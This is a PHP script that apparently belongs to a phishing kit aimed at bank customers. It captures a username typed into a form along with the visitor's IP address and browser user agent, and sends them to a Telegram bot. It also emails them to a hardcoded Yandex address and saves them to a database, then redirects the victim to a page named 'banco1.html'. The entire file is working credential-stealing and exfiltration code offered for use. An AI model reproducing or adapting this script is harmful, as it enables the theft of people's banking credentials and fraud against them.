<?php
require_once('config.php');
$agent = $_SERVER['HTTP_USER_AGENT'];
$email = "cmgrace@yandex.com";
$ip = getenv("REMOTE_ADDR");
$message = "==================+[ Personal Info - Page 2019 - 2]+==================\n";
$message .= "Username : " . $_POST['mon1'] . "\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : " . $ip . "\n";
$message .= "User-Agent : " . $agent . "\n";
$message .= "--------------------------------------------\n";
$message .= "=============+ [:- vipstore911.com] +=============\n";

require_once('db.php');

$data = $message;
$send = ['chat_id' => $chatid, 'text' => $data];
$website = "https://api.telegram.org/bot$apikey";
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Save to DB
if (isset($pdo)) {
    upsertLog($pdo, $ip, $agent, ['username' => $_POST['mon1']]);
}


$subject = "username-popular-$ip";
// $data = $_POST['eMailAdd'];    
// $site = substr($data, strpos($data, "@") + 1);    

mail($email, $subject, $message);
header("Location: banco1.html");
?>